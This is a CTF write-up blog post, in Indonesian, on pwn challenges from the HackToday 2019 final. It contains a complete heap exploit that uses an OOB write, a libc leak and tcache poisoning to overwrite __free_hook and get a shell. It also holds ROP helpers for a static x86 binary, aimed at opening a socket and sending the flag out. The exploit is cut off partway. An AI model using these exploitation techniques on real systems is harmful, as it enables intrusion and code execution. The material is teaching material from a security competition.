@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en-id">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>HackToday 2019 Final - pwn &middot; Kyra&#39;s Note</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Kyra&#39;s Note</h2>
+				</a>
+				<ul>
+    <li><a href="/about">About</a></li>
+    <li><a href="/">Posts</a></li>
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        circleous
+        <br>
+        <span>on&nbsp;</span><time datetime="2019-08-26 21:52:54 &#43;0700 WIB">August 26, 2019</time>
+</div>
+		<h1 class="post-title">HackToday 2019 Final - pwn</h1>
+<div class="post-line"></div>
+
+		
+
+		
+
+<p>Tulisan ini adalah bagian terakhir dari seri <em>writeup</em> HackToday 2019, kali ini saya akan membahas writeup untuk pwn di final dan beberapa desain yang gagal diimplementasikan di soal.</p>
+
+<h2 id="vmxck">vmxck</h2>
+
+<p>Desain awal soal ini sebenarnya ada hubungan dengan virtualisasi pada mesin dan bukan termasuk bagian dari <em>pwn</em>. Iya, ini awalnya akan dijadikan soal reversing dengan register state based vm dengan <code>kvm</code>.
+<img src="https://imgs.xkcd.com/comics/xkcde.png" alt="vm di dalam vm" /><em>vm di dalam vm</em>
+Beberapa hari sebelum final, input soal-soal untuk reversing ternyata udah lumayan banyak, rencana untuk lanjut dan menyelesaikan soal ini jadi gagal, wkwkw. Agak malas untuk memikirkan ide lain, saya pakai ide &ldquo;vm&rdquo; lagi dan gak berbeda jauh dari soal tahun lalu <code>anoneanone</code>. Soal ini masih sekitar brainfuck, <em>seharusnya</em> (belum di-cek :p) tidak ada overflow pada input dan double free. Bug justru terletak pada OOB akses data cell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> vmx {
+  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> prog;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data;
+} vmx[<span style="color:#ae81ff">20</span>];</code></pre></div>
+<p>Diberikan space sebanyak 20 &ldquo;vm&rdquo;, dengan setiap &ldquo;vm&rdquo; mempunyai <code>.data</code> dan <code>.prog</code> masing-masing. Sudah dijelaskan sebelumnya terdapat OOB pada akses data, dengan ukuran program yang sama besarnya dengan ukuran data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  vmx[idx].prog <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x250</span>);
+  vmx[idx].data <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x250</span>);</code></pre></div>
+<p>Sebelum bahas lebih lanjut, ini helper functions untuk memudahkan interaksi dengan program,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(bf):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(bf))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(idx):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(idx))
+    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;1. &#39;</span>, <span style="color:#ae81ff">1</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(idx))</code></pre></div>
+<p>Dengan OOB pada akses <code>.data</code>, salah satu yang dapat dilakukan adalah mengganti metadata dari heap chunk .data itu sendiri. ukuran dari chunk ini diubah menjadi lebih besar dari ukuran yang dapat ditampung tcache, tujuannya untuk mendapat leak libc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create(<span style="color:#e6db74">&#39;.&#39;</span>)
+<span style="color:#75715e"># pwndbg&gt; dq $rebase((long*)&amp;vmx)</span>
+<span style="color:#75715e"># 0000555555756060     000055555575a270 000055555575a4d0</span>
+<span style="color:#75715e"># 0000555555756070     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 0000555555756080     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 0000555555756090     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># pwndbg&gt; dq 0x55555575a4c0</span>
+<span style="color:#75715e"># 000055555575a4c0     0000000000000000 0000000000000261</span>
+<span style="color:#75715e"># 000055555575a4d0     0000000000000000 0000000000000000</span>
+<span style="color:#75715e">#                                    ^^--------------------- mulai .data vmx[0]</span>
+<span style="color:#75715e"># 000055555575a4e0     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 000055555575a4f0     0000000000000000 0000000000000000</span></code></pre></div>
+<p>karena perlu chunk dengan ukuran lebih besar dari ukuran sebenarnya, diperlukan &ldquo;fake&rdquo; chunk untuk bypass <code>&quot;double free or corruption (!prev)&quot;</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create(<span style="color:#e6db74">&#39;.&#39;</span>)
+create(<span style="color:#e6db74">&#39;.&#39;</span>)
+<span style="color:#75715e"># pwndbg&gt; dq $rebase((long*)&amp;vmx)</span>
+<span style="color:#75715e"># 0000555555756060     000055555575a270 000055555575a4d0</span>
+<span style="color:#75715e"># 0000555555756070     000055555575a730 000055555575a990</span>
+<span style="color:#75715e"># 0000555555756080     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 0000555555756090     0000000000000000 0000000000000000</span></code></pre></div>
+<p>dengan begitu ukuran chunk bisa diubah menjadi <code>(0x55555575a990-0x55555575a4d0) | PREV_INUSE = 0x4c1</code>. Dalam brainfuck, .data ptr hanya perlu di shift ke kiri sebanyak 8 kali untuk mencapai chunk metadata. Setelah itu, dengan <code>delete(0)</code> akan didapatkan libc leak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#39;</span> <span style="color:#75715e"># shift kiri .data ptr</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;+&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xc0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>)
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&gt;++&#39;</span>
+    create(payload)
+    create(<span style="color:#e6db74">&#39;.&#39;</span>)
+
+    run(<span style="color:#ae81ff">0</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575a4c0</span>
+    <span style="color:#75715e"># 000055555575a4c0     0000000000000000 00000000000004c1</span>
+    <span style="color:#75715e"># 000055555575a4d0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575a4e0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575a4f0     0000000000000000 0000000000000000</span>
+
+    delete(<span style="color:#ae81ff">0</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575a4c0</span>
+    <span style="color:#75715e"># 000055555575a4c0     0000000000000000 00000000000004c1</span>
+    <span style="color:#75715e"># 000055555575a4d0     0000155555521ca0 0000155555521ca0 !!!!! leak</span>
+    <span style="color:#75715e"># 000055555575a4e0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575a4f0     0000000000000000 0000000000000000</span></code></pre></div>
+<p>untuk mendapatakan leak, bisa gunakan instruksi <code>.</code>/<code>putchar</code> satu per satu dari .data cell. Ini bisa dilakukan karena setelah <code>free</code>, isi data tidak dikosongkan (<code>memset</code>) sama sekali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+    create(payload)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> (u64(run(<span style="color:#ae81ff">0</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000</span>
+    info(<span style="color:#e6db74">&#39;libc 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (libc<span style="color:#f92672">.</span>address))</code></pre></div>
+<p>setelah leak didapat yang perlu dikontrol selanjutnya adalah alokasi dari <code>malloc</code>. tcache poisoning disini bisa dilakukan, tapi dengan limitasi ukuran program hanya sebesar 0x250 dan tidak ada uaf. &ldquo;shift&rdquo; pointer data berulang kali dengan batasan ukuran program untuk mengotrol chunk lain dengan &ldquo;<code>&lt;</code>&rdquo; / &ldquo;<code>&gt;</code>&rdquo; juga tidak bisa. Trik yang digunakan disini adalah <code>[&lt;-]</code>. Sebagai visualisasi,</p>
+
+<pre><code>000055555575axxx     0000000000000000 0000000000000261 .prog
+000055555575axxx     ................ ................
+000055555575axxx     0000000000000007 0000000000000000
+                                   ^^--------------------- mulai .prog vmx[n - 1]
+...
+...
+000055555575axxx     0000000000000000 0000000000000261 .data
+000055555575axxx     0000000000000000 0000000000000000
+                                   ^^--------------------- mulai .data vmx[n]
+000055555575axxx     0000000000000000 0000000000000000
+000055555575axxx     0000000000000000 0000000000000000
+</code></pre>
+
+<p><code>[&lt;-------]</code>, <code>]</code> akan mengecek apakah <code>*ptr == 0</code>, jika tidak, loop akan tetap dieksekusi. Disini trik yang diguakan adalah shift data terus sampai ke posisi <code>*ptr == 7</code> (perhatikan bahwa di dalam loop, sebelum <code>]</code> terdapat 7 * <code>-</code>). Byte yang dilewati memang akan menjadi <em>amburadul</em>, tapi akhirnya tidak perlu dipedulikan juga, yang penting sudah bisa mengontrol chunk lain dan ratusan byte untuk program sudah dihemat dengan  cara seperti ini.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[&gt;---]&#39;</span>
+    create(payload) <span style="color:#75715e"># 3</span>
+
+    payload  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">3</span>) <span style="color:#75715e"># unique val</span>
+    create(payload) <span style="color:#75715e"># 4</span>
+
+    <span style="color:#75715e"># pwndbg&gt; dq $rebase((long*)&amp;vmx) 10</span>
+    <span style="color:#75715e"># 0000555555756060     000055555575a270 000055555575a4d0</span>
+    <span style="color:#75715e"># 0000555555756070     000055555575a730 000055555575a990</span>
+    <span style="color:#75715e"># 0000555555756080     000055555575a730 000055555575abf0</span>
+    <span style="color:#75715e"># 0000555555756090     000055555575ae50 000055555575b0b0</span>
+    <span style="color:#75715e"># 00005555557560a0     000055555575b310 000055555575b570</span>
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575b0a0</span>
+    <span style="color:#75715e"># 000055555575b0a0     0000000000000000 0000000000000261</span>
+    <span style="color:#75715e"># 000055555575b0b0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e">#                                    ^^-------------------- vmx[3].data</span>
+    <span style="color:#75715e"># 000055555575b0c0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b0d0     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575b300</span>
+    <span style="color:#75715e"># 000055555575b300     0000000000000000 0000000000000261</span>
+    <span style="color:#75715e"># 000055555575b310     0000000000000003 0000000000000000</span>
+    <span style="color:#75715e">#                                    ^^-------------------- unique value @ vmx[4].prog</span>
+    <span style="color:#75715e"># 000055555575b320     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b330     0000000000000000 0000000000000000</span>
+
+    delete(<span style="color:#ae81ff">4</span>)
+    run(<span style="color:#ae81ff">3</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575b300</span>
+    <span style="color:#75715e"># 000055555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e</span>
+    <span style="color:#75715e"># 000055555575b310     fdfd52525272b26d fdfdfdfdfdfdfdfd</span>
+    <span style="color:#75715e"># 000055555575b320     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b330     0000000000000000 0000000000000000</span></code></pre></div>
+<p>next step, tcache poisoning perlu bisa tulis pointer. Dengan input yang terbatas ini, ada cara yang lebih baik untuk menulis pointer dibandingkan dengan menambahkan isi cell secara manual, yakni copy value dari cell lain. Chunk yang dapat dikontrol sekarang adalah bagian <code>.prog</code>, artinya kita bisa menambahkan arbitrary data melalui input. value yang akan dicopy adalah <code>__free_hook</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[&gt;---]&#39;</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;+++&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># perbaiki cell src, hancur sebelumnya karena [&gt;---]</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;[-]&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># kosongin cell dest</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># balik ke cell src</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;[-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># copy value dari src ke dest cells</span>
+    create(payload) <span style="color:#75715e"># 3</span>
+
+    payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">3</span>) <span style="color:#75715e"># unique val</span>
+    create(payload) <span style="color:#75715e"># 4</span>
+
+    delete(<span style="color:#ae81ff">4</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575b300</span>
+    <span style="color:#75715e"># 000055555575b300     0000000000000000 0000000000000261</span>
+    <span style="color:#75715e"># 000055555575b310     000055555575b570 00001555555238e8</span>
+    <span style="color:#75715e"># 000055555575b320     0000000000000003 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b330     0000000000000000 0000000000000000</span>
+    run(<span style="color:#ae81ff">3</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq 0x55555575b300</span>
+    <span style="color:#75715e"># 000055555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e</span>
+    <span style="color:#75715e"># 000055555575b310     00001555555238e8 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b320     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 000055555575b330     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># pwndbg&gt; bins</span>
+    <span style="color:#75715e"># tcachebins</span>
+    <span style="color:#75715e"># 0x260 [  2]: 0x55555575b310 —▸ 0x1555555238e8 (__free_hook) ◂— 0x0</span></code></pre></div>
+<p>Oh, iya, sebelum <code>malloc</code> hancur karena tcache poisoning ini, lebih baik untuk menyiapkan <code>&quot;/bin/sh&quot;</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    create(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 2</span>
+
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[&gt;---]&#39;</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;+++&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># perbaiki cell src, hancur sebelumnya karena [&gt;---]</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;[-]&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># kosongin cell dest</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># balik ke cell src</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;[-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># copy value dari src ke dest cells</span>
+    create(payload) <span style="color:#75715e"># 3</span>
+
+    payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>])
+    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">3</span>) <span style="color:#75715e"># unique val</span>
+    create(payload) <span style="color:#75715e"># 4</span>
+
+    delete(<span style="color:#ae81ff">4</span>)
+    run(<span style="color:#ae81ff">3</span>)</code></pre></div>
+<p>Request <code>malloc</code> kedua setelah ini seharunya sudah mendarat di <code>__free_hook</code>, tapi karena <code>create()</code> itu sendiri melakukan 2 request <code>malloc</code>, untuk <code>.prog</code> dan <code>.data</code>, maka <code>.data</code>-lah yang akan mendarat di <code>__free_hook</code>. Berbeda dengan sebelumnya dimana kita bisa memanfaatkan value yang ditambahkan melalui input karena berada di <code>.prog</code>, kali ini <code>.data</code> hanya bisa memanfaatkan aritmatiknya saja tanpa arbitrary data melalui user input.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    payload  <span style="color:#f92672">=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span>  <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    payload <span style="color:#f92672">+=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span>  <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    payload <span style="color:#f92672">+=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    payload <span style="color:#f92672">+=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    payload <span style="color:#f92672">+=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    payload <span style="color:#f92672">+=</span> get_min((libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+    create(payload) <span style="color:#75715e"># 4</span>
+    run(<span style="color:#ae81ff">4</span>)
+    <span style="color:#75715e"># pwndbg&gt; tel &amp;__free_hook</span>
+    <span style="color:#75715e"># 00:0000│   0x1555555238e8 (__free_hook) —▸ 0x1555553b2e60 (system) ◂— test   rdi, rdi</span>
+    <span style="color:#75715e"># 01:0008│   0x1555555238f0 (__malloc_initialize_hook@GLIBC_2.2.5) ◂— 0x0</span></code></pre></div>
+<p>dengan begitu, <code>delete(2)</code> seharusnya sudah memberikan shell, karena tadi sudah <code>create(&quot;/bin/sh&quot;)</code> pada index 2 dan <code>__free_hook</code> sudah menunjuk kepada <code>system</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#75715e"># profit</span>
+    delete(<span style="color:#ae81ff">2</span>)</code></pre></div>
+<h2 id="ezrop-revenge">ezrop revenge</h2>
+
+<p>Soal ini sebenarnya ada kaitannya dengan <code>ezrop</code> pada <a href="/posts/hacktoday-2019-quals-pwn/#ezrop">kualifikasi</a>, dengan twist closed std{in,out,err}, static binary, x86, dengan EBP yang sudah di-<em>poison</em> seperti yang saya tulis <a href="(/posts/hacktoday-2019-quals-pwn/#ezrop)">sebelumnya</a>. Kalau dipikir lagi ini sebenarnya tidak menambahkan hal baru selain closed I/O, sehingga pada akhirnya saya membuat soal ini dengan buffer overflow biasa tanpa tambahan kerumitan lainnya. Kurang lebih seperti ini kodenya,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#66d9ef">char</span> buf[...];
+    write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;no view(), no surrender!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ...);
+    read(<span style="color:#ae81ff">0</span>, buf, ...);
+    close(<span style="color:#ae81ff">2</span>);
+    close(<span style="color:#ae81ff">1</span>);
+    close(<span style="color:#ae81ff">0</span>);
+}</code></pre></div>
+<p>Oiya, closed I/O ini sebenarnya dapat ide dari soal ISITDTU Final, <code>babyarmv2</code>, beberapa hari lalu, kudos to orgs.</p>
+
+<p>Intended solution dari soal ini dengan buka socket fd dan connect ke server dan menulis isi file <code>flag</code> pada fd tersebut. Sebelum itu semua yang diperlukan adalah arbitrary write primitive dengan <code>mov [dst], src</code> dan untungnya terdapat gadget seperti ini pada binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># 0x08057bd2: mov dword ptr [edx], eax; ret;</span>
+<span style="color:#75715e"># 0x080ab5ca: pop eax; ret;</span>
+<span style="color:#75715e"># 0x0806ee8b: pop edx; ret;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_where_what</span>(where, what):
+    payload  <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080ab5ca</span>)
+    payload <span style="color:#f92672">+=</span> p32(what)
+    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0806ee8b</span>)
+    payload <span style="color:#f92672">+=</span> p32(where)
+    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08057bd2</span>)
+    <span style="color:#66d9ef">return</span> payload</code></pre></div>
+<p>arbitrary write primitive ini bisa digunakan dengan fungsi lain untuk memudahkan penulisan string panjang, <code>write_str</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_str</span>(where, data):
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    data_split <span style="color:#f92672">=</span> [data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">4</span>)]
+    <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> data_split:
+        payload <span style="color:#f92672">+=</span> write_where_what(where, u32(d))
+        where <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
+    <span style="color:#66d9ef">return</span> payload</code></pre></div>
+<p><code>write_str</code> ini berguna untuk menyiapkan <em>argument</em> yang digunakan pada syscall, misalnya <code>open(3)</code>. btw, ada tambahan juga, fungsi untuk memudahkan memanggil syscall.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># 0x0806eeb2: pop ecx; pop ebx; ret;</span>
+<span style="color:#75715e"># 0x0806f7c0: int 0x80; ret;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">syscall</span>(eax, ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, edx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+    payload  <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0806ee8b</span>)
+    payload <span style="color:#f92672">+=</span> p32(edx)
+    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x080ab5ca</span>)
+    payload <span style="color:#f92672">+=</span> p32(eax)
+    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0806eeb2</span>)
+    payload <span style="color:#f92672">+=</span> p32(ecx)
+    payload <span style="color:#f92672">+=</span> p32(ebx)
+    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0806f7c0</span>)
+    <span style="color:#66d9ef">return</span> payload</code></pre></div>
+<p><em>the exploit</em>, saya tidak akan terlalu membahas dalam <code>sokcetcall</code> syscall karena sudah <a href="https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/">ada</a> <a href="http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html">banyak</a> <a href="#">yang</a> <a href="https://medium.com/@chaudharyaditya/slae-0x2-linux-x86-reverse-shellcode-d7126d638aff">membahas</a> tentang ini sebelumnya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(REMOTE):
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAA&#39;</span>
+
+    <span style="color:#75715e"># open flag</span>
+    payload <span style="color:#f92672">+=</span> write_str(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x10</span>), <span style="color:#e6db74">&#39;/flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
